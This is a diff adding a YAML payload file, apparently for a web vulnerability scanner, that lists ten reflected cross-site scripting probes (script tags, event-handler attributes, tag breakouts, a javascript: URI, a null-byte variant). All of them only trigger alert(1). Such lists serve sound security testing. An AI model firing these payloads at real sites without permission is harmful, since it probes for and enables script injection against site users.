@@ -1,0 +1,14 @@
+category: xss
+description: "Payloads XSS réfléchi pour injection dans paramètres GET/POST"
+
+payloads:
+  - value: "<script>alert(1)</script>"
+  - value: "<img src=x onerror=alert(1)>"
+  - value: "<svg onload=alert(1)>"
+  - value: "<body onload=alert(1)>"
+  - value: "\"'><script>alert(1)</script>"
+  - value: "</title><script>alert(1)</script>"
+  - value: "<input onfocus=alert(1) autofocus>"
+  - value: "<details open ontoggle=alert(1)>"
+  - value: "javascript:alert(1)"
+  - value: "<%00script>alert(1)</%00script>"
